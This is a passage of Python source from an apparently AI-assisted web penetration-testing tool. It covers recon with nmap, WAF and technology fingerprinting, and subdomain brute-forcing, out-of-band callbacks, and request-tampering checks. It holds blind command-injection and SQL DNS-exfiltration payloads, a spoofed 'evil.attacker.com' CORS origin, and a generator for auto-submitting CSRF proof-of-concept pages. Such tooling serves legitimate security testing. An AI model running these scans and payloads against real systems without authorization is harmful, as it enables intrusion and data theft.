from dataclasses import dataclass
from typing import List, Set, Dict, Optional, Tuple
from .base import *
import threading

# Get console from engine, or create a simple fallback
from .. import engine as _engine
console = getattr(_engine, "console", None)

# Create a simple console if not available
if console is None:
    try:
        from rich.console import Console
        console = Console()
    except ImportError:
        class SimpleConsole:
            def print(self, *args, **kwargs):
                print(*args)
        console = SimpleConsole()

@dataclass
class ReconResult:
    target_input:  str          # user-provided input
    resolved_ip:   str          # resolved IP address
    open_ports:    list         # [{"port":80,"service":"http","version":"nginx 1.18"}]
    http_targets:  list         # [{"url":"http://...","port":80,"ssl":False}]
    subdomains:    list         # ["sub.example.com", ...]
    waf:           str          # "Cloudflare" | "none" | "unknown"
    tech_stack:    dict         # whatweb output
    os_guess:      str          # nmap OS guess
    hostnames:     list         # reverse DNS + cert SANs
    raw_nmap:      str
    raw_whatweb:   str

class ReconEngine:
    """
    Full reconnaissance process for a given domain or IP:

    1. Input parsing — URL, domain, or IP?
    2. DNS resolution — get IP, PTR, MX, NS
    3. nmap — open ports, service versions
    4. HTTP/HTTPS target discovery
    5. wafw00f — WAF detection
    6. whatweb — technology fingerprinting
    7. Subdomain discovery (if subfinder or amass available)
    8. AI analyzes all data and selects highest-priority targets

    Returns: ReconResult and list of HTTP target URLs
    """

    # Common web service ports
    WEB_PORTS = [
        80, 443, 8080, 8443, 8000, 8001, 8008, 8888,
        3000, 3001, 4000, 4443, 5000, 5001, 6443,
        7000, 7001, 9000, 9090, 9443, 10000,
        # Admin/dev ports
        8081, 8082, 8083, 8084, 8085,
        # Common app ports
        3128, 3306, 5432, 6379, 9200, 27017,
    ]

    def __init__(self, ai: "AIEngine"):
        self.ai = ai

    def run(self, target_input: str) -> ReconResult:
        """
        Main recon method.
        target_input: "example.com", "192.168.1.1", "http://app.local", "10.0.2.2:5000"
        """
        console.print(f"\n[cyan]== RECON ==[/cyan]")

        # 1. Parse input
        host, port_hint, is_ip, has_scheme = self._parse_input(target_input)
        console.print(f"  [dim]Input: host={host}  port_hint={port_hint}  "
                      f"is_ip={is_ip}  has_scheme={has_scheme}[/dim]")

        # 2. DNS resolution
        resolved_ip, hostnames = self._resolve(host)
        console.print(f"  [dim]Resolved: {host} -> {resolved_ip}  "
                      f"hostnames={hostnames[:3]}[/dim]")

        # 3. nmap port scan
        open_ports, os_guess, raw_nmap = self._nmap_scan(
            resolved_ip or host, port_hint
        )

        # 4. Discover HTTP targets
        http_targets = self._build_http_targets(
            host, resolved_ip or host, open_ports, port_hint, has_scheme,
            target_input
        )

        # 5. WAF detection
        waf = self._detect_waf(http_targets[0]["url"] if http_targets else f"http://{host}")

        # 6. whatweb
        tech_stack, raw_whatweb = self._whatweb(
            http_targets[0]["url"] if http_targets else f"http://{host}"
        )

        # 7. Subdomain discovery (real domains only)
        subdomains = []
        if not is_ip and "." in host and not host.startswith("10.") \
                and not host.startswith("192.168.") and not host.startswith("172."):
            subdomains = self._subdomain_discovery(host)

        result = ReconResult(
            target_input = target_input,
            resolved_ip  = resolved_ip or host,
            open_ports   = open_ports,
            http_targets = http_targets,
            subdomains   = subdomains,
            waf          = waf,
            tech_stack   = tech_stack,
            os_guess     = os_guess,
            hostnames    = hostnames,
            raw_nmap     = raw_nmap,
            raw_whatweb  = raw_whatweb,
        )

        self._print_summary(result)

        # 8. AI selects highest-priority targets
        if len(http_targets) > 1:
            result.http_targets = self._ai_prioritize(result)

        return result

    # -- 1. Input parsing -----------------------------------------------------
    def _parse_input(self, raw: str) -> tuple:
        """
        Returns: (host, port_hint, is_ip, has_scheme)
        Example:
          "10.0.2.2:5000"    -> ("10.0.2.2", 5000, True, False)
          "http://app.local" -> ("app.local", 80, False, True)
          "example.com"      -> ("example.com", None, False, False)
        """
        has_scheme = raw.startswith(("http://", "https://"))
        if has_scheme:
            parsed    = urllib.parse.urlparse(raw)
            host      = parsed.hostname or raw
            port_hint = parsed.port or (443 if raw.startswith("https") else 80)
        elif "://" in raw:
            parsed    = urllib.parse.urlparse("http://" + raw)
            host      = parsed.hostname or raw
            port_hint = parsed.port
        else:
            # "10.0.2.2:5000" or "example.com:8080"
            if ":" in raw and not raw.count(":") > 1:  # not IPv6
                parts     = raw.rsplit(":", 1)
                host      = parts[0]
                try:
                    port_hint = int(parts[1])
                except ValueError:
                    host      = raw
                    port_hint = None
            else:
                host      = raw
                port_hint = None

        # IP or domain?
        is_ip = bool(re.match(r"^\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}$", host))
        return host, port_hint, is_ip, has_scheme

    # -- 2. DNS ----------------------------------------------------------------
    def _resolve(self, host: str) -> tuple:
        """Returns IP, PTR, hostname list."""
        import socket
        hostnames = []
        try:
            ip = socket.gethostbyname(host)
        except Exception:
            ip = None

        # Reverse DNS
        if ip:
            try:
                ptr = socket.gethostbyaddr(ip)[0]
                if ptr and ptr != host:
                    hostnames.append(ptr)
            except Exception:
                pass

        # Try hostname lookup via nmap
        if shutil.which("nmap") and ip:
            r = _run_cmd(f"nmap -sn --dns-servers 8.8.8.8 {ip}", timeout=10)
            m = re.search(r"\(([^)]+)\)", r.get("output",""))
            if m and m.group(1) not in hostnames:
                hostnames.append(m.group(1))

        return ip or host, hostnames

    # -- 3. nmap ---------------------------------------------------------------
    def _nmap_scan(self, host: str, port_hint: int = None) -> tuple:
        """
        Port scan with nmap.

        Strategy:
        - port_hint given (e.g. :5000) → scan that port only
        - no port_hint → top-1000 + additional web ports
        - --version-intensity 5 — version accuracy
        """
        if not shutil.which("nmap"):
            console.print("  [dim yellow]  nmap not found — skipping port scan[/dim yellow]")
            return [], "unknown", ""

        if port_hint:
            port_spec = str(port_hint)
            console.print(f"  [dim]  nmap: scanning port {port_hint} on {host}...[/dim]")
        else:
            extra_ports = ",".join(str(p) for p in self.WEB_PORTS)
            port_spec   = f"--top-ports 1000,{extra_ports}"
            # Deduplicate
            port_spec   = f"--top-ports 1000 -p {extra_ports}"
            console.print(f"  [dim]  nmap: scanning top-1000 + web ports on {host}...[/dim]")

        out_file = temp_file(f"nmap_{hashlib.md5(host.encode()).hexdigest()[:8]}.txt")

        cmd = (
            f"nmap -sV --version-intensity 5 "
            f"-p {port_spec if port_hint else ','.join(str(p) for p in self.WEB_PORTS)} "
            f"--open -T4 --script=http-title,http-headers,banner "
            f"-oN '{out_file}' "
            f"{host}"
        ) if port_hint else (
            f"nmap -sV --version-intensity 5 "
            f"--top-ports 200 "
            f"-p {','.join(str(p) for p in self.WEB_PORTS)} "
            f"--open -T4 --script=http-title,http-headers,banner "
            f"-oN '{out_file}' "
            f"{host}"
        )

        r          = _run_cmd(cmd, timeout=120)
        raw_output = r.get("output", "")
        open_ports = self._parse_nmap(raw_output)
        os_guess   = self._parse_os(raw_output)

        console.print(f"  [dim]  nmap: {len(open_ports)} open ports[/dim]")
        for p in open_ports[:15]:
            ssl_icon = "🔒" if p.get("ssl") else "  "
            console.print(
                f"  [dim]    {ssl_icon} {p['port']}/tcp  {p['service']:<12}  "
                f"{p['version'][:50]}[/dim]"
            )

        return open_ports, os_guess, raw_output

    def _parse_nmap(self, output: str) -> list:
        """Extracts port information from nmap output."""
        ports  = []
        # "80/tcp   open  http    nginx 1.18.0"
        pattern = re.compile(
            r"^(\d+)/tcp\s+open\s+(\S+)\s*(.*?)$", re.MULTILINE
        )
        for m in pattern.finditer(output):
            port    = int(m.group(1))
            service = m.group(2).lower()
            version = m.group(3).strip()
            ssl     = "ssl" in service or port in (443, 8443, 4443, 6443)
            # http-title scripti
            title   = ""
            title_m = re.search(
                rf"{port}/tcp.*?http-title.*?\n.*?_\s+(.+?)\n", output, re.DOTALL
            )
            if title_m:
                title = title_m.group(1).strip()[:60]
            ports.append({
                "port":    port,
                "service": service,
                "version": version,
                "ssl":     ssl,
                "title":   title,
                "is_web":  self._is_web_port(port, service),
            })
        return ports

    def _parse_os(self, output: str) -> str:
        m = re.search(r"OS details?:\s*(.+?)\n", output)
        if m:
            return m.group(1).strip()[:80]
        m = re.search(r"Aggressive OS guesses?:\s*(.+?)\n", output)
        if m:
            return m.group(1).strip()[:80]
        return "unknown"

    def _is_web_port(self, port: int, service: str) -> bool:
        return (
            port in self.WEB_PORTS or
            "http" in service or
            "www" in service or
            "web" in service
        )

    # -- 4. HTTP targets ----------------------------------------------------
    def _build_http_targets(self, host: str, ip: str, open_ports: list,
                            port_hint: int, has_scheme: bool,
                            original_input: str) -> list:
        """
        Builds list of HTTP/HTTPS URLs from open ports.
        Verifies each one actually responds.
        """
        targets = []
        checked = set()

        # Use port_hint only
        if port_hint and has_scheme:
            scheme = "https" if original_input.startswith("https") else "http"
            url    = f"{scheme}://{host}:{port_hint}" if port_hint not in (80, 443) else f"{scheme}://{host}"
            targets.append({"url": url.rstrip("/"), "port": port_hint,
                            "ssl": scheme == "https", "source": "input"})
            return targets

        if port_hint:
            # Port given without scheme — try both HTTP and HTTPS
            for scheme in ("http", "https"):
                url = f"{scheme}://{host}:{port_hint}"
                if self._http_alive(url):
                    targets.append({"url": url.rstrip("/"), "port": port_hint,
                                    "ssl": scheme=="https", "source": "port_hint"})
                    checked.add(port_hint)
            if targets:
                return targets

        # From nmap-discovered ports
        web_ports = [p for p in open_ports if p.get("is_web")]
        for p in sorted(web_ports, key=lambda x: (
                0 if x["port"] in (80,443) else 1 if x["port"] in (8080,8443) else 2,
                x["port"]
        ))[:10]:
            port  = p["port"]
            if port in checked:
                continue
            ssl   = p.get("ssl", False) or port in (443, 8443, 4443)
            scheme = "https" if ssl else "http"
            url   = (f"{scheme}://{host}" if port in (80,443)
                     else f"{scheme}://{host}:{port}")
            if self._http_alive(url):
                targets.append({"url": url.rstrip("/"), "port": port,
                                "ssl": ssl, "source": "nmap"})
                checked.add(port)

        # Nothing found — try default 80/443
        if not targets:
            for url in [f"http://{host}", f"https://{host}"]:
                if self._http_alive(url):
                    targets.append({"url": url, "port": 443 if "https" in url else 80,
                                    "ssl": "https" in url, "source": "default"})

        console.print(f"  [dim]  HTTP targets: {len(targets)} found[/dim]")
        for t in targets:
            lock_icon = "🔒" if t["ssl"] else "🌐"
            console.print(f"  [dim]    {lock_icon} {t['url']}[/dim]")

        return targets

    def _http_alive(self, url: str) -> bool:
        """Check if URL responds. 3 second timeout."""
        ctx = ssl.create_default_context()
        ctx.check_hostname = False
        ctx.verify_mode    = ssl.CERT_NONE
        try:
            req = urllib.request.Request(url, headers={"User-Agent": DEFAULT_UA})
            opener = urllib.request.build_opener(urllib.request.HTTPSHandler(context=ctx))
            with opener.open(req, timeout=5) as r:
                return r.status < 600
        except Exception:
            return False

    # -- 5. WAF ----------------------------------------------------------------
    def _detect_waf(self, url: str) -> str:
        if shutil.which("wafw00f"):
            r = _run_cmd(f"wafw00f '{url}' -a 2>/dev/null", timeout=30)
            out = r.get("output", "")
            # "The site http://... is behind ... WAF"
            m = re.search(r"is behind (.+?) (?:WAF|firewall)", out, re.I)
            if m:
                waf = m.group(1).strip()
                console.print(f"  [dim]  WAF detected: [bold yellow]{waf}[/bold yellow][/dim]")
                return waf
            if "no waf" in out.lower() or "not detected" in out.lower():
                return "none"
        # Fallback — detect from response headers
        try:
            ctx = ssl.create_default_context()
            ctx.check_hostname = False
            ctx.verify_mode    = ssl.CERT_NONE
            req = urllib.request.Request(url, headers={"User-Agent": DEFAULT_UA})
            opener = urllib.request.build_opener(urllib.request.HTTPSHandler(context=ctx))
            with opener.open(req, timeout=5) as r:
                hdrs = {k.lower(): v.lower() for k, v in r.headers.items()}
                if "cloudflare" in hdrs.get("server","") or "cf-ray" in hdrs:
                    return "Cloudflare"
                if "akamai" in str(hdrs):
                    return "Akamai"
                if "x-sucuri" in hdrs:
                    return "Sucuri"
        except Exception:
            pass
        return "unknown"

    # -- 6. whatweb ------------------------------------------------------------
    def _whatweb(self, url: str) -> tuple:
        if not shutil.which("whatweb"):
            return {}, ""
        r   = _run_cmd(f"whatweb --color=never '{url}' 2>/dev/null", timeout=30)
        out = r.get("output", "")
        # Parse key technologies
        tech = {}
        for m in re.finditer(r"(\w[\w.-]+)\[([^\]]+)\]", out):
            key = m.group(1)
            val = m.group(2)[:80]
            if key not in ("HTTPServer","IP","Country","JQuery","Script","HTML5"):
                tech[key] = val
        if tech:
            console.print(f"  [dim]  Tech: {', '.join(list(tech.keys())[:8])}[/dim]")
        return tech, out

    # -- 7. Subdomain discovery ------------------------------------------------
    def _subdomain_discovery(self, domain: str) -> list:
        subs = set()

        if shutil.which("subfinder"):
            r = _run_cmd(f"subfinder -d '{domain}' -silent 2>/dev/null", timeout=60)
            for line in r.get("output","").splitlines():
                line = line.strip()
                if line and domain in line:
                    subs.add(line.lower())
            console.print(f"  [dim]  subfinder: {len(subs)} subdomains[/dim]")

        elif shutil.which("amass"):
            r = _run_cmd(f"amass enum -passive -d '{domain}' 2>/dev/null", timeout=90)
            for line in r.get("output","").splitlines():
                line = line.strip()
                if line and domain in line:
                    subs.add(line.lower())
            console.print(f"  [dim]  amass: {len(subs)} subdomains[/dim]")

        # DNS brute force (small list)
        common_subs = ["www","mail","api","dev","staging","test","admin",
                       "app","portal","dashboard","vpn","remote","login",
                       "auth","web","beta","demo","shop","store"]
        import socket
        for sub in common_subs:
            fqdn = f"{sub}.{domain}"
            try:
                socket.gethostbyname(fqdn)
                subs.add(fqdn)
            except Exception:
                pass

        result = sorted(subs)[:50]
        if result:
            console.print(f"  [dim]  Subdomains: {result[:5]}{'...' if len(result)>5 else ''}[/dim]")
        return result

    # -- 8. AI prioritization -------------------------------------------------
    def _ai_prioritize(self, result: "ReconResult") -> list:
        """AI selects the highest-priority target from multiple HTTP targets."""
        prompt = f"""Multiple HTTP targets found on {result.target_input}.
Targets: {json.dumps(result.http_targets, indent=2)}
Open ports: {json.dumps([{'port': p['port'], 'service': p['service'], 'version': str(p.get('version', ''))[:40]} for p in result.open_ports], indent=2)}
WAF: {result.waf}
Tech: {list(result.tech_stack.keys())[:10]}

Prioritize targets for web application penetration testing.
Focus on: main app, admin panels, API endpoints.
Return JSON: {{"priority_targets": [{{"url":"...", "reason":"..."}}]}}"""
        ai_result = self.ai._call(prompt, cache=False) or {}
        priority  = ai_result.get("priority_targets", [])
        if not priority:
            return result.http_targets
        url_map = {t["url"]: t for t in result.http_targets}
        ordered = []
        for pt in priority:
            url = pt.get("url","")
            if url in url_map:
                t = dict(url_map[url])
                t["ai_reason"] = pt.get("reason","")
                ordered.append(t)
        remaining = [t for t in result.http_targets if t["url"] not in {p["url"] for p in ordered}]
        return ordered + remaining

    def _print_summary(self, r: "ReconResult"):
        if HAS_RICH:
            from rich.table import Table
            t = Table(title=f"Recon: {r.target_input}", box=box.ROUNDED, show_header=True)
            t.add_column("Item",  style="cyan", width=18)
            t.add_column("Value")
            t.add_row("IP",          r.resolved_ip or "?")
            t.add_row("OS",          r.os_guess[:60] or "unknown")
            t.add_row("WAF",         r.waf)
            t.add_row("Open ports",  str(len(r.open_ports)))
            t.add_row("HTTP targets",str(len(r.http_targets)))
            t.add_row("Subdomains",  str(len(r.subdomains)))
            tech_str = ", ".join(list(r.tech_stack.keys())[:8])
            t.add_row("Tech stack",  tech_str[:80] or "unknown")
            console.print(t)
        else:
            print(f"  IP: {r.resolved_ip}  WAF: {r.waf}  Ports: {len(r.open_ports)}")

class OOBClient:
    """
    Out-of-Band callback detection using interactsh-client.
    For blind SSRF, blind CMDi, blind SQLi (DNS exfil), blind XXE.

    How it works:
      1. interactsh-client starts — provides unique *.oast.pro domain
      2. This domain is embedded in payloads: http://xyz.oast.pro/ssrf-test
      3. If the server sends a request to this URL — interactsh sees the DNS/HTTP callback
      4. oob.check() method: checks if callback was received
    """
    def __init__(self):
        self.domain    = ""
        self._results  : List[str] = []
        self._proc     = None
        self._lock     = threading.Lock()

    def start(self) -> bool:
        if not shutil.which("interactsh-client"):
            return False
        try:
            self._proc = subprocess.Popen(
                ["interactsh-client", "-json", "-v"],
                stdout=subprocess.PIPE, stderr=subprocess.DEVNULL, text=True)
            for _ in range(40):
                line = self._proc.stdout.readline()
                if not line:
                    time.sleep(0.2); continue
                try:
                    data = json.loads(line)
                    if data.get("domain"):
                        self.domain = data["domain"]
                        console.print(f"  [green]* OOB domain: {self.domain}[/green]")
                        t = threading.Thread(target=self._reader, daemon=True)
                        t.start()
                        return True
                except Exception:
                    pass
        except Exception:
            pass
        return False

    def _reader(self):
        if not self._proc: return
        for line in self._proc.stdout:
            if line:
                with self._lock:
                    self._results.append(line.strip())

    def check(self, token: str = "", wait: float = 2.0) -> bool:
        """Check if token string appears in callback. wait — seconds to wait."""
        time.sleep(wait)
        with self._lock:
            for r in self._results:
                if not token or token in r:
                    return True
        return False

    def payloads(self, token: str = "") -> dict:
        """Payloads for different protocols."""
        sfx = f"{token}.{self.domain}" if token else self.domain
        return {
            "http":  f"http://{sfx}/test",
            "https": f"https://{sfx}/test",
            "dns":   sfx,
            "ssrf":  f"http://{sfx}/ssrf",
            "xxe":   f"http://{sfx}/xxe",
            "cmdi":  f"curl http://{sfx}/cmd",
            "sqli_mysql": f"LOAD_FILE(CONCAT(0x5c5c5c5c,0x{sfx.encode().hex()},0x5c61))",
        }

    def stop(self):
        if self._proc:
            try: self._proc.terminate()
            except: pass

class MitmProxyInterceptor:
    """
    Burp Suite Intercept + Repeater functionality via mitmproxy.

    How it works:
    1. Runs as transparent proxy (port 8082)
    2. Intercepts every HTTP request and response
    3. AI analyzes each request:
       - Is there a CSRF token? Missing? → CSRF vulnerability
       - Are cookies secure? HttpOnly, Secure, SameSite?
       - Which parameters are potential injection targets?
       - Does the response contain sensitive data?
    4. AI mutates requests (Repeater style):
       - IDOR test: id=1 → id=2
       - BAC test: inject admin headers
       - SSRF test: set URL param to localhost
       - CSRF test: remove token, observe result
    5. Returns findings

    CLI:  python3 heartbeat.py -t http://app --intercept
    Proxy:  export http_proxy=http://127.0.0.1:8082
    """

    def __init__(self, ai: "AIEngine", target: str, session: "SessionContext"):
        self.ai = ai
        self.target = target
        self.session = session
        self.findings: List[Finding] = []
        self.flow_log: List[dict] = []
        self._lock = threading.Lock()
        self._analyzed_urls: Set[str] = set()
        self._csrf_tokens: dict = {}
        self._cookies_seen: dict = {}
        self._max_flows = 500

    def run_passive_analysis(self, client: "HTTPClient", endpoints: List["Endpoint"]) -> List["Finding"]:
        """
        Active analysis of endpoints (replaces Burp Proxy + Repeater).
        Sends each request and AI analyzes the response.
        """
        console.print(f"[cyan]== MITMPROXY AI INTERCEPTOR ==[/cyan]")
        console.print(f"  [dim]Analyzing {len(endpoints)} endpoints with AI interception...[/dim]")

        for ep in endpoints[:100]:
            try:
                self._intercept_and_analyze(client, ep)
            except Exception as e:
                console.print(f"  [dim red]Intercept error {ep.url}: {e}[/dim red]")

        # Cross-flow analysis
        self._cross_flow_analysis()

        console.print(f"  [green]* Interceptor: {len(self.findings)} findings from "
                      f"{len(self.flow_log)} analyzed flows[/green]")
        return self.findings

    def _intercept_and_analyze(self, client: "HTTPClient", ep: "Endpoint"):
        """Full Burp-style intercept + analyze for a single endpoint."""
        url = ep.url

        # 1. Original request — as baseline
        resp = client.get(url) if ep.method == "GET" else client.post(url, data=ep.params)
        flow = {
            "url": url, "method": ep.method, "params": dict(ep.params),
            "status": resp.get("status", 0), "headers": resp.get("headers", {}),
            "body": resp.get("body", "")[:2000], "timing": resp.get("timing", 0),
        }
        with self._lock:
            self.flow_log.append(flow)

        # 2. Response header analysis — cookie security, CSRF, CORS
        self._analyze_response_security(url, resp)

        # 3. CSRF token analysis
        self._analyze_csrf(client, ep, resp)

        # 4. AI-driven request mutation (Repeater)
        self._ai_repeater(client, ep, resp)

        # 5. SSRF parameter check
        self._check_ssrf_params(client, ep, resp)

        # 6. BAC — role/auth header manipulation
        self._check_bac_manipulation(client, ep, resp)

    def _analyze_response_security(self, url: str, resp: dict):
        """Detect cookie security and other issues from response headers."""
        headers = resp.get("headers", {})
        hdrs_lower = {k.lower(): v for k, v in headers.items()}

        # Cookie security analysis
        set_cookie = hdrs_lower.get("set-cookie", "")
        if set_cookie:
            cookie_issues = []
            if "httponly" not in set_cookie.lower():
                cookie_issues.append("HttpOnly flag missing — cookies can be stolen via XSS")
            if "secure" not in set_cookie.lower() and url.startswith("https"):
                cookie_issues.append("Secure flag missing — cookies can be sent over HTTP")
            if "samesite" not in set_cookie.lower():
                cookie_issues.append("SameSite flag missing — vulnerable to CSRF")

            if cookie_issues:
                with self._lock:
                    self.findings.append(Finding(
                        owasp_id="A05", owasp_name="Security Misconfiguration",
                        title=f"Insecure Cookie Configuration: {url}",
                        risk="Medium", confidence=85,
                        url=url, method="GET", param="Set-Cookie",
                        payload=set_cookie[:100],
                        evidence="; ".join(cookie_issues),
                        baseline_diff="cookie_security_check",
                        tool_output=set_cookie[:300],
                        request_raw=f"GET {url}", response_raw=set_cookie[:200],
                        exploit_cmd=f"curl -v '{url}' | grep -i set-cookie",
                        remediation="Set HttpOnly, Secure, SameSite=Strict on all session cookies.",
                        tool="mitmproxy_interceptor",
                    ))

            self._cookies_seen[url] = set_cookie

        # CORS misconfiguration
        acao = hdrs_lower.get("access-control-allow-origin", "")
        acac = hdrs_lower.get("access-control-allow-credentials", "")
        if acao and acao != "*" and "true" in acac.lower():
            # Origin reflection check
            evil_origin = "https://evil.attacker.com"
            test_resp = self._make_request_with_headers(url, {"Origin": evil_origin})
            if test_resp:
                reflected_acao = test_resp.get("headers", {}).get("Access-Control-Allow-Origin", "")
                if evil_origin in reflected_acao:
                    with self._lock:
                        self.findings.append(Finding(
                            owasp_id="A05", owasp_name="Security Misconfiguration",
                            title=f"CORS Origin Reflection with Credentials: {url}",
                            risk="High", confidence=90,
                            url=url, method="GET", param="Origin",
                            payload=evil_origin,
                            evidence=f"Origin '{evil_origin}' reflected in ACAO with credentials=true",
                            baseline_diff="cors_check",
                            tool_output=f"ACAO: {reflected_acao}, ACAC: {acac}",
                            request_raw=f"GET {url}\nOrigin: {evil_origin}",
                            response_raw=f"Access-Control-Allow-Origin: {reflected_acao}",
                            exploit_cmd=f"curl -H 'Origin: {evil_origin}' -v '{url}'",
                            remediation="Do not reflect arbitrary origins. Whitelist trusted origins only.",
                            confirmed=True, tool="mitmproxy_interceptor",
                        ))

    def _make_request_with_headers(self, url: str, extra_headers: dict) -> Optional[dict]:
        """Send request with custom headers."""
        ctx = ssl.create_default_context()
        ctx.check_hostname = False
        ctx.verify_mode = ssl.CERT_NONE
        try:
            h = {"User-Agent": DEFAULT_UA}
            h.update(extra_headers)
            req = urllib.request.Request(url, headers=h)
            opener = urllib.request.build_opener(urllib.request.HTTPSHandler(context=ctx))
            with opener.open(req, timeout=10) as r:
                return {
                    "status": r.status, "headers": dict(r.headers),
                    "body": r.read(20000).decode("utf-8", errors="replace"),
                }
        except Exception:
            return None

    def _analyze_csrf(self, client: "HTTPClient", ep: "Endpoint", orig_resp: dict):
        """
        CSRF vulnerability check — Burp Repeater style.
        1. Does the form have a CSRF token?
        2. Is the request accepted without the token?
        3. Does it work with a different/invalid token?
        """
        if ep.method != "POST":
            return

        body = orig_resp.get("body", "")
        # CSRF token search
        csrf_patterns = [
            r'name=["\']?(?:csrf|_token|csrfmiddlewaretoken|authenticity_token|__RequestVerificationToken)["\']?\s+value=["\']?([^"\'>\s]+)',
            r'<meta\s+name=["\']?csrf-token["\']?\s+content=["\']?([^"\']+)',
        ]
        csrf_token = ""
        csrf_field = ""
        discovered_csrf_fields = [
            k for k in ep.params.keys()
            if any(t in k.lower() for t in [
                "csrf", "_token", "csrfmiddlewaretoken",
                "authenticity_token", "__requestverificationtoken",
            ])
        ]
        for pat in csrf_patterns:
            m = re.search(pat, body, re.I)
            if m:
                csrf_token = m.group(1)
                csrf_field = re.search(r'name=["\']?(\w+)', pat).group(1) if "name=" in pat else "csrf_token"
                break

        # If parameter discovery already found CSRF-related fields,
        # don't raise "missing CSRF" based only on current response body.
        if not csrf_token and discovered_csrf_fields:
            csrf_token = "DISCOVERED_IN_FORM_FIELDS"
            csrf_field = discovered_csrf_fields[0].split(":")[-1]

        if not csrf_token:
            # POST endpoint without CSRF token — potential CSRF
            # Check if it's a state-changing request
            state_changing = any(k in ep.url.lower() for k in [
                "update", "delete", "create", "edit", "change", "modify",
                "add", "remove", "post", "submit", "transfer", "password",
                "settings", "profile", "admin", "config",
            ])
            if state_changing:
                with self._lock:
                    self.findings.append(Finding(
                        owasp_id="A01", owasp_name="Broken Access Control",
                        title=f"Missing CSRF Protection: {ep.url}",
                        risk="High", confidence=75,
                        url=ep.url, method="POST", param="csrf_token",
                        payload="No CSRF token in form",
                        evidence=f"State-changing POST endpoint has no CSRF token protection",
                        baseline_diff="csrf_check",
                        tool_output=f"Form fields: {list(ep.params.keys())[:10]}",
                        request_raw=f"POST {ep.url}\n{json.dumps(ep.params)[:200]}",
                        response_raw=body[:200],
                        exploit_cmd=self._generate_csrf_poc(ep),
                        remediation="Add CSRF token to all state-changing forms. Use SameSite=Strict cookies.",
                        tool="mitmproxy_interceptor",
                    ))
            return

        # CSRF token present — test without it
        params_no_csrf = {k: v for k, v in ep.params.items() if k.lower() not in [
            "csrf", "_token", "csrfmiddlewaretoken", "authenticity_token",
            "__requestverificationtoken", "csrf_token",
        ]}
        resp_no_csrf = client.post(ep.url, data=params_no_csrf)
        no_csrf_body = resp_no_csrf.get("body", "").lower()
        # Check response doesn't contain CSRF/token error messages (= server rejected it)
        csrf_rejected = any(k in no_csrf_body for k in [
            "csrf", "token", "forbidden", "invalid request", "security error",
            "verification failed", "access denied",
        ])
        likely_success = any(k in no_csrf_body for k in [
            "success", "completed", "updated", "created", "saved",
            "transaction successful", "done",
        ])
        likely_auth_redirect = (
            "redirecting" in no_csrf_body and "login" in no_csrf_body
        )
        if (
            resp_no_csrf.get("status") in (200, 201)
            and not csrf_rejected
            and likely_success
            and not likely_auth_redirect
        ):
            with self._lock:
                self.findings.append(Finding(
                    owasp_id="A01", owasp_name="Broken Access Control",
                    title=f"CSRF Token Not Validated: {ep.url}",
                    risk="High", confidence=85,
                    url=ep.url, method="POST", param=csrf_field,
                    payload="Removed CSRF token — request still accepted",
                    evidence=f"POST without CSRF token returned {resp_no_csrf['status']} with no rejection message",
                    baseline_diff=f"With token: {orig_resp.get('status')}, Without: {resp_no_csrf['status']}",
                    tool_output=resp_no_csrf.get("body", "")[:2000],
                    request_raw=f"POST {ep.url}\n{json.dumps(params_no_csrf)[:200]}",
                    response_raw=resp_no_csrf.get("body", "")[:2000],
                    exploit_cmd=self._generate_csrf_poc(ep),
                    remediation="Validate CSRF token on every state-changing request server-side.",
                    confirmed=True, tool="mitmproxy_interceptor",
                ))

        # Test with invalid token
        params_bad_csrf = dict(ep.params)
        for k in list(params_bad_csrf.keys()):
            if k.lower() in ["csrf", "_token", "csrfmiddlewaretoken",
                             "authenticity_token", "csrf_token"]:
                params_bad_csrf[k] = "INVALID_TOKEN_TEST_12345"
        resp_bad = client.post(ep.url, data=params_bad_csrf)
        bad_body = resp_bad.get("body", "").lower()
        bad_rejected = any(k in bad_body for k in [
            "csrf", "token", "forbidden", "invalid request", "security error",
            "verification failed", "access denied",
        ])
        likely_bad_success = any(k in bad_body for k in [
            "success", "completed", "updated", "created", "saved",
            "transaction successful", "done",
        ])
        likely_bad_auth_redirect = (
            "redirecting" in bad_body and "login" in bad_body
        )
        if (
            resp_bad.get("status") in (200, 201)
            and not bad_rejected
            and likely_bad_success
            and not likely_bad_auth_redirect
        ):
            with self._lock:
                self.findings.append(Finding(
                    owasp_id="A01", owasp_name="Broken Access Control",
                    title=f"CSRF Token Bypass — Invalid Token Accepted: {ep.url}",
                    risk="High", confidence=90,
                    url=ep.url, method="POST", param=csrf_field,
                    payload="INVALID_TOKEN_TEST_12345",
                    evidence=f"Invalid CSRF token accepted, returned {resp_bad['status']} with no rejection",
                    baseline_diff=f"Valid token: {orig_resp.get('status')}, Invalid: {resp_bad['status']}",
                    tool_output=resp_bad.get("body", "")[:2000],
                    request_raw=f"POST {ep.url}\n{json.dumps(params_bad_csrf)[:200]}",
                    response_raw=resp_bad.get("body", "")[:2000],
                    exploit_cmd=self._generate_csrf_poc(ep),
                    remediation="Validate CSRF token strictly — reject unknown/modified tokens.",
                    confirmed=True, tool="mitmproxy_interceptor",
                ))

    def _generate_csrf_poc(self, ep: "Endpoint") -> str:
        """Generate CSRF PoC HTML."""
        fields = "\n".join(
            f'    <input type="hidden" name="{k}" value="{v}" />'
            for k, v in list(ep.params.items())[:10]
        )
        return (
            f'<html><body onload="document.forms[0].submit()">\n'
            f'<form method="POST" action="{ep.url}">\n{fields}\n'
            f'</form></body></html>'
        )

    def _ai_repeater(self, client: "HTTPClient", ep: "Endpoint", orig_resp: dict):
        """
        AI-driven Repeater — AI analyzes requests and creates mutations.
        Unlike Burp Repeater: AI decides what to modify.
        """
        if ep.url in self._analyzed_urls:
            return
        self._analyzed_urls.add(ep.url)

        # AI receives request and response
        prompt = f"""You are a penetration tester using an HTTP intercepting proxy (like Burp Suite Repeater).
Analyze this HTTP request/response and suggest specific test mutations.

REQUEST:
  Method: {ep.method}
  URL: {ep.url}
  Parameters: {json.dumps(dict(list(ep.params.items())[:15]), default=str)}

RESPONSE:
  Status: {orig_resp.get('status', 0)}
  Headers: {json.dumps(dict(list(orig_resp.get('headers', {}).items())[:10]))}
  Body (first 500 chars): {orig_resp.get('body', '')[:500]}

What specific mutations would reveal vulnerabilities? Focus on:
1. Parameter value changes that might expose IDOR/BAC
2. Header injections for access control bypass
3. Parameters that look like they accept URLs (SSRF)
4. Any authentication/session weaknesses visible

Return JSON:
{{
  "mutations": [
    {{
      "type": "idor|bac|ssrf|auth_bypass|param_tamper",
      "param": "parameter_name",
      "original_value": "original",
      "mutated_value": "new_value",
